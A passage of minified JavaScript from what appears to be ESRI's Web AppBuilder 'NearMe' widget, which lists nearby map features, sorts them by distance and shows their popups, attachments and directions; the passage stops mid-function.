// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/NearMe/item-list.html":'\x3cdiv class\x3d"esriCTItemlList"\x3e\r\n    \x3cdiv class\x3d"esriCTBackButton"\x3e\r\n        \x3cdiv class\x3d"esriCTItemLeftArrow"\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"esriCTItemRightArrow"\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"esriCTItemCount esriCTLoadingIcon"\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"esriCTItemName"\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e\r\n',"url:widgets/NearMe/swiperLayout.html":'\x3cdiv class\x3d"swiper-container"\x3e\r\n    \x3cdiv class\x3d"swiper-wrapper"\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"swiper-pagination"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"swiper-button-prev"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"swiper-button-next"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"swiper-scrollbar"\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("require dojo/_base/declare dijit/_WidgetBase dojo/dom-construct dojo/query dojo/_base/array dojo/_base/lang dijit/layout/ContentPane dojo/dom-attr dojo/dom-style dojo/dom-class dojo/on dojo/Deferred dojo/Evented dojo/promise/all jimu/dijit/Message jimu/dijit/TabContainer dojo/text!./item-list.html esri/Color esri/dijit/Directions esri/dijit/PopupTemplate esri/graphic esri/geometry/Point esri/geometry/Polyline esri/geometry/Polygon esri/SpatialReference esri/geometry/geometryEngine esri/layers/FeatureLayer esri/layers/GraphicsLayer esri/symbols/jsonUtils esri/symbols/SimpleFillSymbol esri/symbols/SimpleLineSymbol esri/symbols/SimpleMarkerSymbol esri/tasks/query esri/tasks/RelationshipQuery esri/units dojo/_base/fx dojo/number jimu/LayerInfos/LayerInfos jimu/FilterManager esri/geometry/webMercatorUtils dijit/registry esri/renderers/jsonUtils jimu/symbolUtils dojo/keys dijit/focus dojo/string ./libs/swiper dojo/text!./swiperLayout.html".split(" "),
function(M,N,O,g,p,q,k,y,n,e,l,t,v,P,G,Q,R,S,z,T,H,A,U,B,V,w,C,I,W,X,J,r,K,Y,Z,aa,ba,D,L,ca,E,h,da,ea,F,u,fa,ga,ha){return N([O,P],{_itemListTemplate:S,_serviceArea:null,_operationalLayers:null,_selectedPoint:null,_panels:{},_currentPanel:null,map:null,config:null,folderUrl:null,loading:null,nls:null,parentDiv:null,outerContainer:null,_featureListContent:null,_featureInfoPanel:null,_directionInfoPanel:null,_tabContainer:null,_isNoFeature:null,_isSlide:!0,_loadAttachmentTimer:null,_failedLayers:[],
_routeCalculated:!1,_selectedLayer:null,_selectedItem:null,_selectedFeature:null,_selectedFeatureItem:null,_featureGraphicsLayer:null,_directionsWidget:null,_layerCount:null,_tables:[],_searchedFeatures:{},_attributeSearchList:null,postCreate:function(){this._tables=[];this._panels={};this._failedLayers=[];this._operationalLayers=null;this._searchedFeatures={};this._attributeSearchList=null;this._tablesLayer={};this.domNode=g.create("div",{"class":"esriCTItemListMainContainer"},this.outerContainer);
this.filterManager=ca.getInstance();this._getUpdatedLayerFilters();this._createPanels();this._loadFeatureLayers();this._featureGraphicsLayer=new W;this.map.addLayer(this._featureGraphicsLayer)},_createFilterButton:function(a){var b;b={};if(!this.config.filterSettings||!this.config.filterSettings.filters||0>=this.config.filterSettings.filters.length)b.style="display: none";a=g.create("div",b,a);b=g.create("div",{"class":"esriCTFilterIconContainer",title:this.nls.filterTitle},a);g.create("div",{"class":"esriCTFilterIcon",
style:{"background-color":this.selectedThemeColor}},b);this.own(t(b,"click",k.hitch(this,function(){this.emit("show-filter")})));return a},_createPanels:function(){var a;this._panels.layerListPanel=g.create("div",{"class":"esriCTLayerList"},this.domNode);this._panels.featureListPanel=g.create("div",{"class":"esriCTFeatureList"},this.domNode);a=g.toDom(this._itemListTemplate).childNodes[0];n.set(a,"tabindex",0);l.add(a,"esriCTPanelHeader");this._panels.featureListPanel.appendChild(a);this._featureListContent=
g.create("div",{"class":"esriCTFeatureListContent"},null);e.set(this._featureListContent,"color",this.config.fontColor);this._panels.featureListPanel.appendChild(this._featureListContent);this._attachEventOnBackButton(this._panels.featureListPanel);this._panels.infoPanel=g.create("div",{"class":"esriCTDirectionInfoPanel"},this.domNode);a=g.toDom(this._itemListTemplate).childNodes[0];n.set(a,"tabindex",0);l.add(a,"esriCTPanelHeader");this._panels.infoPanel.appendChild(a);this._attachEventOnBackButton(this._panels.infoPanel);
this._filterButton=this._createFilterButton(this.domNode);this._featureInfoPanel=new y({},null);this._featureInfoPanel.startup();this.map.webMapResponse.itemInfo.itemData.applicationProperties&&this.map.webMapResponse.itemInfo.itemData.applicationProperties.viewing.routing.enabled?(this._directionInfoPanel=new y({},null),this._directionInfoPanel.startup(),this._tabContainer=new R({tabs:[{title:this.nls.informationTabTitle,content:this._featureInfoPanel},{title:this.nls.directionTabTitle,content:this._directionInfoPanel}]},
g.create("div",{"class":"esriCTTabContainer"},this._panels.infoPanel)),this._tabContainer.startup(),a={"class":"esriCTProximityParent"},void 0===this.config.enableProximitySearch||this.config.enableProximitySearch||(a.style="display: none"),a=g.create("div",a,this._panels.infoPanel),this.own(this._tabContainer.on("tabChanged",k.hitch(this,function(a){this.emit("tab-change",a);a!==this.nls.directionTabTitle||this._routeCalculated||this._initializeDirectionWidget();this.parentDivId&&h.byId(this.parentDivId)&&
h.byId(this.parentDivId).resize&&h.byId(this.parentDivId).resize()})))):(this._panels.infoPanel.appendChild(this._featureInfoPanel.domNode),l.add(this._featureInfoPanel.domNode,"esriCTFeatureInfo"),(a=p(".esriCTItemListMainContainer .esriCTDirectionInfoPanel .esriCTPanelHeader"))&&l.add(a[0],"esriCTBorderBottom"),a={"class":"esriCTProximityParent",style:"bottom: 0px"},void 0===this.config.enableProximitySearch||this.config.enableProximitySearch||(a.style="display: none"),a=g.create("div",a,this._panels.infoPanel));
a=g.create("div",{"class":"esriCTProximityIconContainer",title:this.nls.proximityButtonTooltip},a);g.create("div",{"class":"esriCTProximityIcon",style:{"background-color":this.selectedThemeColor}},a);this.own(t(a,"click",k.hitch(this,function(){this._selectedFeature&&this._selectedFeature.geometry&&this.emit("init-proximity",new A(this._selectedFeature.geometry))})));this.parentDivId&&h.byId(this.parentDivId)&&h.byId(this.parentDivId).resize&&h.byId(this.parentDivId).resize()},_attachEventOnBackButton:function(a){var b,
c;b=p(".esriCTItemlList",a)[0];c=p(".esriCTBackButton",a)[0];b&&c&&this.own(t(b,"click, keypress",k.hitch(this,function(a){var b;if("keypress"===a.type&&(b=a.charCode||a.keyCode,b!==F.ENTER))return;a.stopPropagation();"none"!==e.get(c,"display")&&this._isSlide&&(this._isSlide=!1,this._selectedItem=null,this._clearGrahics(),this._clearDirections(),this._isFeatureList?(this._isFeatureList=!1,this._showPanel("featureListPanel",!0),u.focus(p(".esriCTItemlList[tabindex\x3d'0']",this._featureListContent)[0])):
(this.loading.hide(),this._clearContent(this._featureListContent),this.showAllLayers(),this._selectedLayer=null,this._isFeatureList=!1,this._showPanel("layerListPanel",!0),u.focus(p(".esriCTItemlList[tabindex\x3d'0']",this._panels.layerListPanel)[0])))})))},_loadFeatureLayers:function(){var a,b;this._operationalLayers=[];this._tables=this.map.webMapResponse.itemInfo.itemData.tables;for(b=0;b<this.config.searchLayers.length;b++)this.config.searchLayers[b].popupInfo||this.config.searchLayers.splice(b,
1);for(b=0;b<this.config.searchLayers.length;b++)this.config.searchLayers[b].popupInfo&&(a=new I(this.config.searchLayers[b].url,{infoTemplate:new H(this.config.searchLayers[b].popupInfo)}),a.id=this.config.searchLayers[b].id?this.config.searchLayers[b].id:"FL_"+this.config.searchLayers[b].title+b,a.title=this.config.searchLayers[b].title,this.config.searchLayers[b].definitionExpression&&a.setDefinitionExpression(this.config.searchLayers[b].definitionExpression),this.config.searchLayers[b].renderer&&
a.setRenderer(da.fromJson(this.config.searchLayers[b].renderer)),a.index=b,a.layerIndex=this._operationalLayers.length,a.isMapServer=this.config.searchLayers[b].isMapServer,a.baseURL=this.config.searchLayers[b].baseURL,a.showAttachments=this.config.searchLayers[b].popupInfo.showAttachments,this._operationalLayers.push(a),this._onLayerLoad(a))},_onLayerLoad:function(a){a.loaded?a.tableInfos=this._getRelatedTableInfo(a.index):this.own(a.on("load",k.hitch(this,function(){a.tableInfos=this._getRelatedTableInfo(a.index)})))},
_getRelatedTableInfo:function(a){var b,c=[];(b=this._operationalLayers[a])&&q.forEach(b.relationships,k.hitch(this,function(a){q.forEach(this._tables,k.hitch(this,function(d,m){d.url.replace(/.*?:\/\//g,"")===(b.baseURL+a.relatedTableId).replace(/.*?:\/\//g,"")&&d.popupInfo&&(d.relationshipIds||(d.relationshipIds={}),d.relationshipIds[b.id]=a.id,c.push(m),this._tablesLayer[d.id]=new I(d.url),this._tablesLayer[d.id].showAttachments=!0)}))}));return c},hasValidLayers:function(){return this._operationalLayers&&
0<this._operationalLayers.length?!0:!1},_clearContent:function(a){a&&g.empty(a)},displayLayerList:function(a,b,c){var d=[];this.loading.hide();this._layerCount=0;this._isSlide=this._isNoFeature=!0;this._attributeSearchList=null;c?(this._attributeSearchList=c,this._tabContainer&&this._tabContainer.controlNode&&(e.set(this._tabContainer.controlNode,"display","none"),l.add(this._tabContainer.containerNode,"esriCTTopBorder"))):this._tabContainer&&this._tabContainer.controlNode&&(e.set(this._tabContainer.controlNode,
"display","block"),l.remove(this._tabContainer.containerNode,"esriCTTopBorder"));this.clearResultPanel();this._getUpdatedLayerFilters();this._searchedFeatures={};this.showAllLayers();this._setSearchedLocation(a);this._setServiceArea(b);this._failedLayers=[];this._filterConfiguredLayer(d);G(d).then(k.hitch(this,function(){l.remove(this._filterButton,"esriCTHidden");this._onFeatureCountComplete()}))},_getUpdatedLayerFilters:function(){L.getInstance(this.map,this.map.webMapResponse.itemInfo).then(k.hitch(this,
function(a){q.forEach(this.config.searchLayers,k.hitch(this,function(b){var c=a.getLayerInfoById(b.id);c&&(b.definitionExpression=c.getFilter())}))}))},_filterConfiguredLayer:function(a){if(1<this._operationalLayers.length){this._currentPanel=this._panels.layerListPanel;e.set(this._currentPanel,"display","block");e.set(this._currentPanel,"left","0px");for(var b=0;b<this._operationalLayers.length;b++)this._resetFilter(this._operationalLayers[b].layerIndex),this._createItemTemplate(this._operationalLayers[b],
a)}else this._layerCount=1,this._resetFilter(this._operationalLayers[0].layerIndex),this._onSingleLayerFound(a,this._operationalLayers[0])},_onSingleLayerFound:function(a,b){var c;a&&(c=new v,a.push(c));(a=p(".esriCTBackButton",this._panels.featureListPanel)[0])&&e.set(a,"display","none");this._currentPanel=this._panels.featureListPanel;e.set(this._currentPanel,"display","block");e.set(this._currentPanel,"left","0px");b&&this._displayFeatureList(b,c)},_onSingleFeatureFound:function(a){this._displayFilteredFeatures(a.attributes[this._selectedLayer.objectIdField]);
this._showFeatureDetails(null,a);if(a=p(".esriCTBackButton",this._panels.infoPanel)[0])e.set(a,"display","block"),1===this._layerCount&&(e.set(a,"display","none"),e.set(this._panels.featureListPanel,"display","none"))},_createItemTemplate:function(a,b){var c;c=g.toDom(this._itemListTemplate).childNodes[0];l.add(c,"esriCTDisabled");e.set(c,"color",this.config.fontColor);this._currentPanel.appendChild(c);this._setItemName(c,a.title);this._queryForCountOnly(c,a,b);this._attachClickEvent(c,a,!0)},_setItemName:function(a,
b){if(a=p(".esriCTItemName",a)[0])n.set(a,"innerHTML",b),n.set(a,"title",b)},_attachClickEvent:function(a,b){this.own(t(a,"click, keypress",k.hitch(this,function(c){var d;if("keypress"===c.type&&(d=c.charCode||c.keyCode,d!==F.ENTER))return;!l.contains(a,"esriCTDisabled")&&this._isSlide&&(c.stopPropagation(),this._isSlide=!1,this._selectedItem=a,(c=p(".esriCTBackButton",this._panels.featureListPanel)[0])&&e.set(c,"display","block"),this._displayFeatureList(b,null))})))},_displayFeatureList:function(a,
b){this._clearContent(this._featureListContent);this._selectedLayer=a;if(this.map.webMapResponse.itemInfo.itemData.applicationProperties&&this.map.webMapResponse.itemInfo.itemData.applicationProperties.viewing.routing.enabled){var c,d,f;c=p(".jimu-tab",this._panels.infoPanel);d=p(".jimu-tab .control",this._panels.infoPanel);f=p(".esriCTItemListMainContainer .esriCTDirectionInfoPanel .esriCTPanelHeader");d&&d[0]&&c&&c[0]&&f&&f[0]&&("esriGeometryPolygon"===a.geometryType&&this.config.intersectSearchedLocation?
(l.add(c[0],"esriCTOverrideHeight"),l.add(d[0],"esriCTHidden"),l.add(f[0],"esriCTBorderBottom")):(l.remove(c[0],"esriCTOverrideHeight"),l.remove(d[0],"esriCTHidden"),l.remove(f[0],"esriCTBorderBottom")))}this._setItemName(this._panels.featureListPanel,this._selectedLayer.title);this._queryForFeatureList(b)},_getQueryParams:function(a){var b=new Y;b.spatialRelationship="esriSpatialRelIntersects";b.outSpatialReference=this.map.spatialReference;b.outFields=["*"];if(this._attributeSearchList)this._attributeSearchList[a.id]&&
0<this._attributeSearchList[a.id].length?b.objectIds=this._attributeSearchList[a.id]:b.where="1\x3d2";else if(this._serviceArea||this._selectedPoint)b.geometry=this._serviceArea||this._selectedPoint.geometry;return b},_queryForCountOnly:function(a,b,c){var d,f;f=this._getQueryParams(b);this.config.intersectSearchedLocation&&"esriGeometryPolygon"===b.geometryType&&this._selectedPoint&&(f.geometry=this._selectedPoint.geometry);d=new v;f.where&&"1\x3d2"===f.where?(e.set(a,"display","none"),n.set(a,"tabindex",
"-1"),u.focus(p(".esriCTItemlList[tabindex\x3d'0']",a.parentElement)[0]),this.config.selectedSearchLayerOnly&&this._showHideOperationalLayer(b.url,b.id,!1),d.resolve()):b.queryFeatures(f,k.hitch(this,function(c){0<c.features.length?(this._selectedLayer=b,this._layerCount++,this._searchedFeatures[b.id]=c.features,this._setItemCount(a,c.features.length,!0),this._showFilteredFeaturesOnLoad(c.features,b.id)):(e.set(a,"display","none"),n.set(a,"tabindex","-1"),u.focus(p(".esriCTItemlList[tabindex\x3d'0']",
a.parentElement)[0]),this.config.selectedSearchLayerOnly&&this._showHideOperationalLayer(b.url,b.id,!1));d.resolve()}),k.hitch(this,function(){a&&(e.set(a,"display","none"),n.set(a,"tabindex","-1"),u.focus(p(".esriCTItemlList[tabindex\x3d'0']",a.parentElement)[0]),this._showHideOperationalLayer(b.url,b.id,!1));this._failedLayers.push(b.title);d.resolve()}));c.push(d)},_getFeatureLayerDetailsFormArray:function(a){var b,c;if(this._operationalLayers&&0<this._operationalLayers.length)for(c=this._operationalLayers.length,
b=0;b<c;b++)if(this._operationalLayers[b].id===a)return this._operationalLayers[b];return null},_showFilteredFeaturesOnLoad:function(a,b){var c,d="",f;b=this._getFeatureLayerDetailsFormArray(b);if(this.config.selectedSearchLayerOnly&&(1<a.length&&(a=this._getSortedFeatureList(a)),f=this._getMaxResultCountValue(a.length,b.maxRecordCount))){for(c=0;c<f;c++)d&&(d+=","),d+=a[c].attributes[this._selectedLayer.objectIdField];a=this._selectedLayer.objectIdField+" in ("+d+")";this._setFilterOnMapLayer(a,
b.id,b.url,b.isMapServer)}},_onFeatureCountComplete:function(){this._isNoFeature?(this.clearResultPanel(),e.set(this._panels.layerListPanel,"display","block"),e.set(this._panels.layerListPanel,"left","0px"),g.create("div",{"class":"esriCTNoFeatureFound",innerHTML:this.nls.noFeatureFoundText},this._panels.layerListPanel)):1===this._layerCount&&1!==this._operationalLayers.length&&(e.set(this._panels.layerListPanel,"display","none"),this._onSingleLayerFound(null,this._selectedLayer));if(this._failedLayers.length){var a=
this.nls.unableToFetchResults+"\n\x3c/t\x3e\x3cul\x3e\x3cli\x3e"+this._failedLayers.join("\n \x3c/li\x3e\x3cli\x3e")+"\x3c/li\x3e\x3c/ul\x3e";this._showMessage(a)}this.loading.hide();this.parentDivId&&h.byId(this.parentDivId)&&h.byId(this.parentDivId).resize&&h.byId(this.parentDivId).resize()},_queryForFeatureList:function(a){var b;this.loading.show();this._searchedFeatures[this._selectedLayer.id]?(this._hideAllLayers(),0<this._searchedFeatures[this._selectedLayer.id].length&&this._creatFeatureList(this._searchedFeatures[this._selectedLayer.id]),
this.loading.hide(),a&&a.resolve()):(b=this._getQueryParams(this._selectedLayer),this.config.intersectSearchedLocation&&this._selectedLayer&&"esriGeometryPolygon"===this._selectedLayer.geometryType&&this._selectedPoint&&(b.geometry=this._selectedPoint.geometry),this._selectedLayer.queryFeatures(b,k.hitch(this,function(b){this._hideAllLayers();0<b.features.length&&(this._showFilteredFeaturesOnLoad(b.features,this._selectedLayer.id),this._creatFeatureList(b.features));this.loading.hide();a&&a.resolve()}),
k.hitch(this,function(){this.loading.hide();this._failedLayers.push(this._selectedLayer.title);a&&a.resolve()})))},resetAllFilters:function(){for(var a=0;a<this._operationalLayers.length;a++)this._resetFilter(this._operationalLayers[a].layerIndex)},_setItemCount:function(a,b,c){var d,f;d=p(".esriCTItemCount",a)[0];f=p(".esriCTItemName",a)[0];d&&(l.remove(d,"esriCTLoadingIcon"),c?(b=this._getMaxResultCountValue(b,this._selectedLayer.maxRecordCount),n.set(d,"innerHTML","("+D.format(b)+")"),b&&(this._isNoFeature=
!1,l.remove(a,"esriCTDisabled"),n.set(a,"tabindex","0"),u.focus(p(".esriCTItemlList[tabindex\x3d'0']",a.parentElement)[0]))):(a=D.format(b.toFixed(2))+" "+this.nls.units[this.config.bufferDistanceUnit.value].acronym,n.set(d,"innerHTML",a),f&&n.set(f,"title",n.get(f,"title")+" "+a)))},_getMaxResultCountValue:function(a,b){b||(b=1E3);return!this._attributeSearchList&&this.config.maxResultCount&&this.config.maxResultCount<=b?a<this.config.maxResultCount?a:this.config.maxResultCount:a<b?a:b},_creatFeatureList:function(a){var b,
c,d="",f,m;this._isNoFeature=!1;0<a.length&&(a=this._getSortedFeatureList(a));m=this._getMaxResultCountValue(a.length,this._selectedLayer.maxRecordCount);if(1===m)this._onSingleFeatureFound(a[0]);else{for(b=0;b<m;b++)d&&(d+=","),d+=a[b].attributes[this._selectedLayer.objectIdField],c=g.toDom(this._itemListTemplate).childNodes[0],l.add(c,"esriCTFeatureListItem"),n.set(c,"tabindex","0"),this._featureListContent.appendChild(c),this._setItemName(c,a[b].getTitle()),this._attributeSearchList||"polygon"===
a[b].geometry.type&&this.config.intersectSearchedLocation?(f=p(".esriCTItemCount",c)[0])&&l.remove(f,"esriCTLoadingIcon"):a[b].hasOwnProperty("distanceToLocation")&&this._setItemCount(c,a[b].distanceToLocation,!1),this._attachEventOnFeatureDiv(c,a[b]);this.parentDivId&&h.byId(this.parentDivId)&&h.byId(this.parentDivId).resize&&h.byId(this.parentDivId).resize();this._displayFilteredFeatures(d);this._showPanel("featureListPanel");u.focus(p(".esriCTItemlList[tabindex\x3d'0']",this._featureListContent)[0]);
this.loading.hide()}},_displayFilteredFeatures:function(a){this.config.selectedSearchLayerOnly&&(this._showHideOperationalLayer(this._selectedLayer.url,this._selectedLayer.id,!0),this._selectedLayer.setDefinitionExpression(this._selectedLayer.objectIdField+" in ("+a+")"))},_setFilterOnMapLayer:function(a,b,c,d){b&&(d&&(b=b.substring(0,b.lastIndexOf("_"))),(c=this.map.getLayer(b))&&this.filterManager.applyWidgetFilter(b,this.id,a))},_resetFilter:function(a){var b;b=this._operationalLayers[a].isMapServer?
this._operationalLayers[a].id.substring(0,this._operationalLayers[a].id.lastIndexOf("_")):this._operationalLayers[a].id;this.filterManager.getWidgetFilter(b,this.id)?(this._setFilterOnMapLayer("",this._operationalLayers[a].id,this._operationalLayers[a].url,this._operationalLayers[a].isMapServer),L.getInstance(this.map,this.map.webMapResponse.itemInfo).then(k.hitch(this,function(c){var d,f;if(f=c.getLayerInfoById(b))d=f.getFilter(),!d&&this._operationalLayers[a].isMapServer&&(f=c.getLayerInfoById(this._operationalLayers[a].id))&&
(d=f.getFilter()),this.config.searchLayers[a].definitionExpression=d,this._operationalLayers[a].setDefinitionExpression(d)}))):this._operationalLayers[a]&&this.config.searchLayers[a]&&this._operationalLayers[a].setDefinitionExpression(this.config.searchLayers[a].definitionExpression)},_getSortedFeatureList:function(a){var b,c;c=this._canGetGeodesicDistance();for(b=0;b<a.length;b++)a[b].distanceToLocation=this._attributeSearchList?a[b].getTitle().toLowerCase():c?this._getGeodesicDistances(a[b].geometry):
this._selectedPoint?C.distance(this._selectedPoint.geometry,a[b].geometry,this.config.bufferDistanceUnit.distanceUnit):0;a.sort(function(a,b){return a.distanceToLocation<b.distanceToLocation?-1:a.distanceToLocation>b.distanceToLocation?1:0});return a},_canGetGeodesicDistance:function(){var a;a=new w(4326);return this.config.isGeodesic&&this._selectedPoint&&E.canProject(this._selectedPoint.geometry,a)?!0:!1},_getGeodesicDistances:function(a){var b,c,d;if(!this._selectedPoint)return 0;b="point"===this._selectedPoint.geometry.type?
this._selectedPoint.geometry:this._selectedPoint.geometry.getPoint(0,0);if("point"!==a.type)if((a=C.nearestCoordinate(a,b))&&!a.isEmpty)a=a.coordinate;else return 0;c=new B([[b.x,b.y],[a.x,a.y]]);c.setSpatialReference(b.spatialReference);b=new w(4326);E.canProject(a,b)&&(c=E.project(c,b),d=C.geodesicLength(c,this.config.bufferDistanceUnit.distanceUnit),isNaN(d)&&(d=0));return d},_attachEventOnFeatureDiv:function(a,b){this.own(t(a,"click, keypress",k.hitch(this,function(c){if("keypress"===c.type&&
(c=c.charCode||c.keyCode,c!==F.ENTER))return;this._isFeatureList=!0;(c=p(".esriCTBackButton",this._panels.infoPanel)[0])&&e.set(c,"display","block");this._showFeatureDetails(a,b)})))},_showFeatureDetails:function(a,b){this._setItemName(this._panels.infoPanel,this._selectedLayer.title);this._showPanel("infoPanel");this._tabContainer&&this._tabContainer.selectTab(this.nls.informationTabTitle);this._selectedFeatureItem=a;this._selectedFeature=b;this._clearDirections();this._highlightFeatureOnMap();this._displayFeatureInfo(b);
this.parentDivId&&h.byId(this.parentDivId)&&h.byId(this.parentDivId).resize&&h.byId(this.parentDivId).resize()},_displayFeatureInfo:function(a){var b,c;this._loadAttachmentTimer&&clearTimeout(this._loadAttachmentTimer);this._featureInfoPanel&&(this._featureInfoPanel.set("content",""),this._attributeSearchList||this._addDistanceToLocationInDetailsPanel(a),this._showPopupInfo(a,a._layer),this.config.attributeSymbology&&this.config.attributeSymbology.hasOwnProperty(this._selectedLayer.id)&&this._checkAttributeSymbology(a));
this.config.zoomToFeature&&("point"===a.geometry.type?(b=a.geometry,this._selectedPoint?(c=this._getPointFromGeometry(this._selectedPoint.geometry),b={paths:[[[b.x,b.y],[c.x,c.y]]],spatialReference:this.map.spatialReference},b=new B(b),this.map.setExtent(b.getExtent().expand(1.5))):this.map.centerAndZoom(a.geometry,this.map.getMaxZoom()-1)):this.map.setExtent(a.geometry.getExtent().expand(1.5)));this._getRelatedRecords(a)},_addDistanceToLocationInDetailsPanel:function(a){var b;a.hasOwnProperty("distanceToLocation")&&
(a=D.format(a.distanceToLocation.toFixed(2))+" "+this.nls.units[this.config.bufferDistanceUnit.value].acronym,a=g.create("div",{innerHTML:fa.substitute(this.nls.approximateDistanceTitle,{DistanceToLocation:a}),"class":"esriCTDistanceToLocation"}),b=new y({style:{padding:"0px"}}),b.set("content",a),this._featureInfoPanel.addChild(b))},_getRelatedRecords:function(a){q.forEach(this._selectedLayer.tableInfos,k.hitch(this,function(b){this._queryRelatedRecords(this._tables[b],a.attributes[this._selectedLayer.objectIdField])}))},
_queryRelatedRecords:function(a,b){if(this._selectedLayer&&a){var c=new Z;c.objectIds=[parseInt(b,10)];c.outFields=["*"];c.relationshipId=a.relationshipIds[this._selectedLayer.id];a.layerDefinition&&a.layerDefinition.definitionExpression&&(c.definitionExpression=a.layerDefinition.definitionExpression);this._selectedLayer.queryRelatedFeatures(c,k.hitch(this,function(c){c=c[b];q.forEach(c?c.features:[],k.hitch(this,function(b){b.setInfoTemplate(new H(a.popupInfo));this._showPopupInfo(b,this._tablesLayer[a.id])}));
this.parentDivId&&h.byId(this.parentDivId)&&h.byId(this.parentDivId).resize&&h.byId(this.parentDivId).resize()}))}},_showPopupInfo:function(a,b){var c,d,f;this._featureInfoPanel&&a&&(f=new y({"class":"esriCTPopupInfo"}),c=a.getContent(),d=h.byId(c.id),f.set("content",c),this._featureInfoPanel.addChild(f),this._checkAttachments(d,a,b))},_checkAttachments:function(a,b,c){var d;l.add(p(".mediaSection",a.domNode)[0],"esriCTHidden");d=p(".attachmentsSection",a.domNode)[0];g.empty(d);l.remove(d,"hidden");
c.hasAttachments&&c.showAttachments?(this.loading.show(),this._loadAttachmentTimer=setTimeout(k.hitch(this,function(){this._showAttachments(b,d,c,a)}),500)):this._createGallery(c,d,[],a)},_showAttachments:function(a,b,c,d){a=a.attributes[c.objectIdField];g.empty(b);c.queryAttachmentInfos(a,k.hitch(this,function(a){this.loading.hide();this._createGallery(c,b,a,d);this.parentDivId&&h.byId(this.parentDivId)&&h.byId(this.parentDivId).resize&&h.byId(this.parentDivId).resize()}))},_createGallery:function(a,
b,c,d){var f,m,e,h,x,n;c=this._checkForHyperlinks(c,this._selectedFeature);var r=c.length;if(c&&0<c.length||a&&a.infoTemplate&&a.infoTemplate.info&&a.infoTemplate.info.mediaInfos&&0<a.infoTemplate.info.mediaInfos.length){r+=a.infoTemplate.info.mediaInfos.length;this.loading.show();a=g.create("div",{"class":"esriCTThumbnailContainer"},b);g.create("div",{style:{clear:"both"}},a);h=g.toDom(ha);x=p(".swiper-wrapper",h)[0];e=!1;if(c&&0<c.length)for(a=0;a<c.length;a++)-1!==c[a].contentType.indexOf("image")&&
c[a].contentType.match(/(\/tiff)/)&&(c[a].contentType="application/tiff"),c[a].contentType&&-1<c[a].contentType.indexOf("image")?(f=g.create("div",{"class":"swiper-slide"},x),m=g.create("img",{alt:c[a].url,"class":"esriCTAttachmentImg",src:c[a].url},f),this._attachEventOnImage(m),e=!0):c[a].contentType&&-1<c[a].contentType.toLowerCase().indexOf("video/mp4")?(f=g.create("div",{"class":"swiper-slide"},x),m=g.toDom('\x3cvideo class\x3d"esriCTVideoElement" src\x3d"'+c[a].url+'" height\x3d"auto" width\x3d"100%" controls\x3e\x3csource src\x3d"'+
c[a].url+'" type\x3d"'+c[a].contentType+'" poster\x3d"'+c[a].url+'"\x3e\x3c/video\x3e'),g.place(m,f),e=!0):(f=g.create("div",{"class":"esriCTNonImageAttachmentContainer"},b),m=this.folderUrl+"images/no-attachment.png",m=g.create("img",{alt:c[a].url,"class":"esriCTNonImageAttachmentImg esriCTAutoHeight",src:m},f),m=g.create("div",{alt:c[a].url,"class":"esriCTImageFormatDiv"},f),this._fetchDocumentContentType(c[a],m),this._attachEventOnImage(f));this._charts=[];this._checkMediaInfos(x,d).then(k.hitch(this,
function(a){if(e||a)g.place(h,b),n=new ga(h,{height:"250px",pagination:".swiper-pagination",nextButton:".swiper-button-next",prevButton:".swiper-button-prev",slidesPerView:1,paginationClickable:!0,spaceBetween:30,loop:!0}),this.own(t(n,"onSlideChangeStart",k.hitch(this,function(){q.forEach(p(".esriCTVideoElement",x),k.hitch(this,function(a){a.pause()}))}))),q.forEach(this._charts,k.hitch(this,function(a){a.resize(200,200)})),1===r&&(n.nextButton&&0<n.nextButton.length&&l.add(n.nextButton[0],"esriCTHidden"),
n.prevButton&&0<n.prevButton.length&&l.add(n.prevButton[0],"esriCTHidden"),n.lockSwipes());this.loading.hide()}))}},_checkForHyperlinks:function(a,b){var c,d;c=[];c=b.attributes;for(d in c)c.hasOwnProperty(d)&&c[d]&&String(c[d]).match(/^(http(s?):)/)&&(String(c[d]).match(/\.(png|jpg|jpeg|gif|bmp)(\/|$)/i)?(b={},b.contentType="image/"+String(c[d]).match(/\.(png|jpg|jpeg|gif|bmp)(\/|$)/i)[1],b.url=c[d],a.push(b)):String(c[d]).match(/\.(mp4)(\/?)/i)&&(b={contentType:"video/mp4"},b.url=c[d],a.push(b)));
return a},_checkMediaInfos:function(a,b){var c,d,f,m,e;f=new v;m=[];b._mediaInfos&&0<b._mediaInfos.length?e=b._mediaInfos:b&&b.template.info&&b.template.info.mediaInfos&&0<b.template.info.mediaInfos.length&&(e=b.template.info.mediaInfos);e&&b._mediaInfos&&0<b._mediaInfos.length?setTimeout(k.hitch(this,function(){for(var h=0;h<e.length;h++){var l=e[h];if("image"===l.type||"image"!==l.type&&l.value.fields&&0<l.value.fields.length)c=g.create("div",{"class":"swiper-slide"},a),"image"===l.type?(d=g.create("img",
{alt:l.value.sourceURL,"class":"esriCTAttachmentImg",src:l.value.sourceURL},c),this._attachEventOnImage(d)):m.push(this._loadMediaCharts(b,l,c))}0<m.length?G(m).then(k.hitch(this,function(){f.resolve(!0)})):f.resolve(!0)}),1E3):f.resolve(!1);return f.promise},_loadMediaCharts:function(a,b,c){var d=new v,f=this,m=["dojox/charting/Chart2D","dojox/charting/action2d/Tooltip"];a=b.value.theme||a.chartTheme;k.isString(a)&&(a=a.replace(/\./gi,"/"),-1===a.indexOf("/")&&(a="dojox/charting/themes/"+a));a||
